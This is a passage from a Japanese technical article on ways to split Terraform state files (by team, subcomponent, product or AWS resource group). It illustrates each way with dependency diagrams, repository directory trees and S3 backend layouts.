├── remote_state.tf # terraform_remote_state ブロックを使用する      ├── alb.tf      ├── cloudwatch.tf      ├── ec2.tf      ├── ecs.tf      ├── eks.tf      ├── iam.tf      ├── vpc.tf      ├── \uD83D\uDCC2 tes      │    ├── backend.tfvars # sreチームの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg      │    ├── backend.tfvars # sreチームの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd           ├── backend.tfvars # sreチームの状態を持つ tfstate ファイルを指定する           ...【チーム別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合運用チーム責務範囲別の場合、異なるリモートバックエンドで管理するとバックエンドが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリモートバックエンドの場合この場合では、プロバイダーアカウント別に分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 frontend-team│    └── terraform.tfstate # frontendチームの状態を持つ│├── \uD83D\uDCC2 backend-team│    └── terraform.tfstate # backendチームの状態を持つ│└── \uD83D\uDCC2 sre-team      └── terraform.tfstate # sreチームの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...プロダクトのサブコンポーネント別 - ★★この分割方法についてプロダクトのサブコンポーネント (例：アプリ、ネットワーク、認証/認可、監視など) 別でtfstateファイルを分割し、中間層もこれに基づいて設計します。この分割方法により、サブコンポーネントの管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。Things to Know Before Working With Terraform – Part 1 | EndavaTerraform organization — Part I : What if you split your components ? | by Amine Charot | Medium▶ おすすめ度についてterraform_remote_stateブロック地獄になっていくため、適切な数 (3〜5個くらい) にしておくように注意が必要です。この分割方法は、後述のAWSリソースの種類グループとごっちゃになってしまう場合があるため、プロダクトのサブコンポーネントとして意識的に分割させる必要があります\uD83D\uDC4D【サブコンポーネント別】状態の依存関係図例えば、以下のサブコンポーネントに分割した状況と仮定します。application (Web3層系)auth (認証/認可系)monitor (監視系)network (ネットワーク系)ここで仮定した状況では、各プロダクトの tfstate ファイルの依存は一方向最終的に、networkサブコンポーネントやauthサブコンポーネントの tfstate ファイルに依存しているとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: プロダクトのサブコンポーネント別---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWS        subgraph tes-bucket            application[\\"application-tfstate<br>Web3層と周辺AWSリソース<br>(ALB, APIGateway, CloudFront, EC2, ECS, EKS, RDS, S3, SNS, など)\\"]            auth[\\"auth-tfstate<br>(IAMなど)\\"]            monitor[\\"monitor-tfstate<br>(CloudWatch, など)\\"]            network[\\"network-tfstate<br>(Route53, VPC, など)\\"]            application-..->network            application-..->auth            monitor-..->application        end        subgraph stg-bucket            stg[\\"tfstate\\"]        end        subgraph prd-bucket            prd[\\"tfstate\\"]        end        end【サブコンポーネント別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合プロダクトのサブコンポーネント別の分割パターンの場合、異なるリポジトリで管理するとリポジトリが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリポジトリの場合この場合では、プロダクトのサブコンポーネント別に分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。\uD83D\uDC31 aws-repository/├── \uD83D\uDCC2 application/│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ├── alb.tf│    ├── cloudfront.tf│    ├── ec2.tf│    ├── ecs.tf│    ├── eks.tf│    ├── ses.tf│    ├── sns.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # applicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # applicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # applicationコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 auth/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── iam.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # authコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # authコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # authコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 monitor/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── cloudwatch.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # monitorコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # monitorコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # monitorコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 network      ├── provider.tf      ├── output.tf # 他の tfstate ファイルから依存される      ├── route53.tf      ├── vpc.tf      ├── \uD83D\uDCC2 tes/ # Tes環境      │    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/ # Stg環境      │    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd/ # Prd環境           ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する           ...【サブコンポーネント別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合プロダクトのサブコンポーネント別の分割パターンの場合、異なるリモートバックエンドで管理するとバックエンドが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリモートバックエンドの場合この場合では、プロダクトのサブコンポーネント別に分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 application│    └── terraform.tfstate # applicationコンポーネントの状態を持つ│├── \uD83D\uDCC2 auth│    └── terraform.tfstate # authコンポーネントの状態を持つ│├── \uD83D\uDCC2 monitor│    └── terraform.tfstate # monitorコンポーネントの状態を持つ│└── \uD83D\uDCC2 network      └── terraform.tfstate # networkコンポーネントの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...運用チーム責務範囲別 \xd7 プロダクトサブコンポーネント別 - ★この分割方法について運用チーム責務範囲別とプロダクトサブコンポーネント別を組み合わせてtfstateファイルを分割し、中間層もこれに基づいて設計します。この分割方法により、各運用チーム内のサブコンポーネントの管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。▶ おすすめ度について【チーム別 \xd7 サブコンポーネント別】状態の依存関係図以下の運用チームに分割した状況と仮定します。また、各運用チームでTerraformを変更できる管理者が相当数するため、プロダクトのサブコンポーネント別にも分割したとします。frontendチームapplicationmonitorbackendチームapplicationmonitorsreチームapplicationauthmonitornetworkここで仮定した状況では、各プロダクトのtfstateファイルの依存は一方向最終的に、sreチームの管理する tfstate ファイルに依存しているとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: 運用チーム責務範囲別 \xd7 プロダクトサブコンポーネント別---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWS        subgraph tes-bucket            subgraph frontend-team               frontendApplication[\\"application-tfstate<br>(CloudFront, S3, など)\\"]               frontendMonitor[\\"monitor-tfstate<br>(CloudWatch, など)\\"]            end            subgraph backend-team                backendApplication[\\"application-tfstate<br>(API Gateway, ElastiCache, RDS, SES, SNS, など)\\"]                backendMonitor[\\"monitor-tfstate<br>(CloudWatch, など)\\"]            end            subgraph sre-team                sreApplication[\\"application-tfstate<br>Web3層と周辺AWSリソース<br>(ALB, EC2, ECS, EKS, SNS, など)\\"]                auth[\\"auth-tfstate<br>(IAM, など)\\"]                sreMonitor[\\"monitor-tfstate<br>(CloudWatch, など)\\"]                network[\\"network-tfstate<br>(Route53, VPC, など)\\"]            end            frontendApplication-...->network            sreApplication-...->auth            sreApplication-...->network            backendApplication-...->auth            backendApplication-...->network            frontendMonitor-...->frontendApplication            sreMonitor-...->sreApplication            backendMonitor-...->backendApplication        end    subgraph stg-bucket        stg[\\"tfstate\\"]    end    subgraph prd-bucket        prd[\\"tfstate\\"]    end    end【チーム別 \xd7 サブコンポーネント別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合この場合では、運用チーム責務範囲別とプロダクトサブコンポーネント別を組み合わせて分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。\uD83D\uDC31 aws-frontend-team-repository/├── \uD83D\uDCC2 application/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── cloudfront.tf│    ├── ses.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # frontendチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # frontendチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # frontendチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 monitor/      ├── provider.tf      ├── remote_state.tf # terraform_remote_state ブロックを使用する      ├── cloudwatch.tf      ├── \uD83D\uDCC2 tes/ # Tes環境      │    ├── backend.tfvars # frontendチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/ # Stg環境      │    ├── backend.tfvars # frontendチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd/ # Prd環境            ├── backend.tfvars # frontendチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する            ...\uD83D\uDC31 aws-backend-team-repository/├── \uD83D\uDCC2 application/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── api_gateway.tf│    ├── elasticache.tf│    ├── rds.tf│    ├── ses.tf│    ├── sns.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # backendチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # backendチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # backendチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 monitor/      ├── provider.tf      ├── remote_state.tf # terraform_remote_state ブロックを使用する      ├── cloudwatch.tf      ├── \uD83D\uDCC2 tes/ # Tes環境      │    ├── backend.tfvars # backendチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/ # Stg環境      │    ├── backend.tfvars # backendチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd/ # Prd環境            ├── backend.tfvars # backendチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する            ...\uD83D\uDC31 aws-sre-team-repository/├── \uD83D\uDCC2 application/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── alb.tf│    ├── ec2.tf│    ├── ecs.tf│    ├── eks.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # sreチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # sreチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # sreチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 auth/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── iam.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # sreチームが管理するauthコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # sreチームが管理するauthコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # sreチームが管理するauthコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 monitor/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── cloudwatch.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # sreチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # sreチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # sreチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 network      ├── provider.tf      ├── output.tf # 他の tfstate ファイルから依存される      ├── route53.tf      ├── vpc.tf      ├── \uD83D\uDCC2 tes/ # Tes環境      │    ├── backend.tfvars # sreチームが管理するnetworkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/ # Stg環境      │    ├── backend.tfvars # sreチームが管理するnetworkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd/ # Prd環境            ├── backend.tfvars # sreチームが管理するnetworkコンポーネントの状態を持つ tfstate ファイルを指定する            ...▼ 同じリポジトリの場合運用チーム責務範囲別とプロダクトサブコンポーネント別を組み合わせる分割パターンの場合、同じリポジトリで管理するとリポジトリが巨大になってしまいます。そのため、これはお勧めしません。【チーム別 \xd7 サブコンポーネント別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合運用チーム責務範囲別とプロダクトサブコンポーネント別を組み合わせる分割パターンの場合、異なるリモートバックエンドで管理するとバックエンドが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリモートバックエンドの場合この場合では、運用チーム責務範囲別とプロダクトサブコンポーネント別を組み合わせて分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 frontend-team│    ├── \uD83D\uDCC2 application│    │    └── terraform.tfstate # frontendチームが管理するapplicationコンポーネントの状態を持つ│    ││    └── \uD83D\uDCC2 monitor│         └── terraform.tfstate # frontendチームが管理するmonitorコンポーネントの状態を持つ│├── \uD83D\uDCC2 backend-team│    ├── \uD83D\uDCC2 application│    │    └── terraform.tfstate # backendチームが管理するapplicationコンポーネントの状態を持つ│    ││    └── \uD83D\uDCC2 monitor│          └── terraform.tfstate # backendチームが管理するmonitorコンポーネントの状態を持つ│└── \uD83D\uDCC2 sre-team      ├── \uD83D\uDCC2 application      │    └── terraform.tfstate # sreチームが管理するapplicationコンポーネントの状態を持つ      │      ├── \uD83D\uDCC2 auth      │    └── terraform.tfstate # sreチームが管理するauthコンポーネントの状態を持つ      │      ├── \uD83D\uDCC2 monitor      │    └── terraform.tfstate # sreチームが管理するmonitorコンポーネントの状態を持つ      │      └── \uD83D\uDCC2 network            └── terraform.tfstate # sreチームが管理するnetworkコンポーネントの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...同じテナント内のプロダクト別この分割方法について同じテナント (例：同じAWSアカウントの同じVPC) 内に複数の小さなプロダクトがある場合、プロダクト別でtfstateファイルを分割し、中間層もこれに基づいて設計します。ここでいうプロダクトは、アプリを動かすプラットフォーム (例：EKS、ECS、AppRunner、EC2) とそれを取り巻くAWSリソースを指しています。この分割方法により、各プロダクトの管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。▶ おすすめ度について【同じテナント内のプロダクト】状態の依存関係図例えば、以下のプロダクトに分割した状況と仮定します。fooプロダクトbarプロダクト共有networkコンポーネント (例：VPC、Route53)ここで仮定した状況では、各プロダクトの tfstate ファイルの依存は一方向最終的に、共有networkコンポーネントの tfstate ファイルに依存しているとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: 同じテナント内のプロダクト---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWS        subgraph tes-bucket            foo-product[\\"foo-product-tfstate<br>(アプリを動かすプラットフォームのAWSリソース)\\"]-..->network            bar-product[\\"bar-product-tfstate<br>(アプリを動かすプラットフォームのAWSリソース)\\"]-..->network            network[\\"network-tfstate<br>(Route53, VPC)\\"]        end    subgraph stg-bucket        stg[\\"tfstate\\"]    end    subgraph prd-bucket        prd[\\"tfstate\\"]    end    end【同じテナント内のプロダクト】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合この場合では、同じテナント内のプロダクトに分割したtfstateファイルを、異なるリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。# fooプロダクトの tfstate ファイルのリポジトリ\uD83D\uDC31 aws-foo-product-repository/├── provider.tf├── remote_state.tf # terraform_remote_state ブロックを使用する├── \uD83D\uDCC2 tes/ # Tes環境│    ├── backend.tfvars # fooプロダクトの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/ # Stg環境│    ├── backend.tfvars # fooプロダクトの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 prd/ # Prd環境      ├── backend.tfvars # fooプロダクトの状態を持つ tfstate ファイルを指定する      ...# barプロダクトの tfstate ファイルのリポジトリ\uD83D\uDC31 aws-bar-product-repository/├── provider.tf├── remote_state.tf # terraform_remote_state ブロックを使用する├── \uD83D\uDCC2 tes/ # Tes環境│    ├── backend.tfvars # barプロダクトの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/ # Stg環境│    ├── backend.tfvars # barプロダクトの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 prd/ # Prd環境      ├── backend.tfvars # barプロダクトの状態を持つ tfstate ファイルを指定する      ...# 共有networkコンポーネントの tfstate ファイルのリポジトリ\uD83D\uDC31 aws-network-repository/├── output.tf # 他の tfstate ファイルから依存される├── provider.tf├── route53.tf├── vpc.tf├── \uD83D\uDCC2 tes/ # Tes環境│    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/ # Stg環境│    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 prd/ # Prd環境      ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      ...▼ 同じリポジトリの場合この場合では、同じテナント内のプロダクトに分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83D\uDC31 aws-repository/├── \uD83D\uDCC2 foo-product/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # fooプロダクトの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # fooプロダクトの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # fooプロダクトの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 bar-product/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # barプロダクトの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # barプロダクトの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # barプロダクトの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 network      ├── provider.tf      ├── output.tf # 他の tfstate ファイルから依存される      ├── route53.tf      ├── vpc.tf      ├── \uD83D\uDCC2 tes/ # Tes環境      │    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/ # Stg環境      │    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd/ # Prd環境           ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する           ...【同じテナント内のプロダクト】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合同じテナント内のプロダクトの場合、異なるリモートバックエンドで管理するとバックエンドが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリモートバックエンドの場合この場合では、同じテナント内のプロダクトに分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 foo-product│    └── terraform.tfstate # fooプロダクトの状態を持つ│├── \uD83D\uDCC2 bar-product│    └── terraform.tfstate # barプロダクトの状態を持つ│└── \uD83D\uDCC2 network      └── terraform.tfstate # networkコンポーネントの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...AWSリソースの種類グループ別この分割方法についてAWSリソースの種類グループ別でtfstateファイルを分割し、中間層もこれに基づいて設計します。この分割方法により、各AWSリソースの種類グループも管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。▶ おすすめ度についてterraform_remote_stateブロック地獄になっていくため、適切な数 (3〜5個くらい) にしておくように注意が必要です。特にこの分割方法は、グループ数がどんどん増えていく可能性があります\uD83D\uDE07【種類グループ別】状態の依存関係図例えば、以下の種類グループに分割した状況と仮定します。application (Webサーバー、Appサーバー系)auth (認証/認可系)datastore (DBサーバー系)cicd (CI/CD系)monitor (監視系)network (ネットワーク系)ここで仮定した状況では、各プロダクトのtfstateファイルの依存は一方向最終的に、networkグループやauthグループの tfstate ファイルに依存しているとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: AWSリソースの種類グループ別---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWS        subgraph tes-bucket            application[\\"application-tfstate<br>例: ALB, API Gateway, CloudFront, EC2, ECS, EKS, SNS, など\\"]            auth[\\"auth-tfstate<br>例: IAM, など\\"]            cicd[\\"cicd-tfstate<br>例: Code3兄弟, など\\"]            monitor[\\"monitor-tfstate<br>例: CloudWatch, など\\"]            network[\\"network-tfstate<br>例: Route53, VPC, など\\"]            datastore[\\"datastore-tfstate<br>例: ElastiCache, RDS, S3, など\\"]            application-....->auth            application-..->datastore            application-...->network            cicd-..->application            datastore-..->network            monitor-..->application            monitor-..->datastore       end    subgraph stg-bucket        stg[\\"tfstate\\"]    end    subgraph prd-bucket        prd[\\"tfstate\\"]    end    end【種類グループ別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合AWSリソースの種類グループ別の分割パターンの場合、異なるリポジトリで管理するとリポジトリが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリポジトリの場合この場合では、AWSリソースの種類グループ別に分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。\uD83D\uDC31 aws-repository/├── \uD83D\uDCC2 application/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── alb.tf│    ├── api_gateway.tf│    ├── cloudfront.tf│    ├── ec2.tf│    ├── ecs.tf│    ├── eks.tf│    ├── ses.tf│    ├── sns.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # applicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # applicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # applicationコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 auth/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── iam.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # authコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # authコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # authコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 cicd/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── codebuild.tf│    ├── codecommit.tf│    ├── codedeploy.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # cicdコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # cicdコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # cicdコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 datastore/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── elasticache.tf│    ├── rds.tf│    ├── s3.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # datastoreコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # datastoreコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # datastoreコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 monitor/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── cloudwatch.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # monitorコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # monitorコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # monitorコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 network      ├── provider.tf      ├── output.tf # 他の tfstate ファイルから参照できるように、outputブロックを定義する      ├── route53.tf      ├── vpc.tf      ├── \uD83D\uDCC2 tes/ # Tes環境      │    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/ # Stg環境      │    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd/ # Prd環境           ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する           ...【種類グループ別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合AWSリソースの種類グループ別の分割パターンの場合、異なるリモートバックエンドで管理するとバックエンドが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 